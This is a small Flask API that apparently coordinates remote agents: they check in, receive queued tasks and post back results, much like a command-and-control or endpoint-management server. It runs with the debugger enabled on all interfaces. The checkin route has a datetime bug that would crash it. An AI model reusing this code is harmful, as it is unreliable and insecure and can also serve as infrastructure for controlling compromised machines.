from datetime import datetime
from flask import Flask, request, jsonify

from database import EndpointDatabase

app = Flask(__name__)

db = EndpointDatabase()


@app.route("/")
def index():
    # TODO: check user agent and tell browsers to get bent
    return ("you're a human. go away. this is an api", 400)


@app.route("/api/checkin")
def checkin():
    agentid = request.args.get("agentid")
    if agentid is None:
        return ("agentid query parameter required", 400)

    endpoint = db.get_endpoint(agentid)

    if endpoint is None:
        return ("unknown agentid", 404)

    last_seen = datetime.datetime.utcnow().isoformat() + "Z"
    endpoint["last_seen"] = last_seen
    db.save_endpoint(agentid, endpoint)

    if db.get_tasks_for_endpoint(agentid):
        return jsonify(db.get_tasks_for_endpoint(agentid))
    else:
        return ("no tasks", 204)


@app.route("/api/post_result", methods=["POST"])
def post_result():
    data = request.json
    agentid = data.get("agentid")
    task_id = data.get("task_id")
    result = data.get("result")

    if not agentid or not task_id or result is None:
        return ("missing parameters", 400)

    success = db.post_task_result(agentid, task_id, result)
    if not success:
        return ("failed to post result", 400)

    return ("result posted", 200)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8443, debug=True)
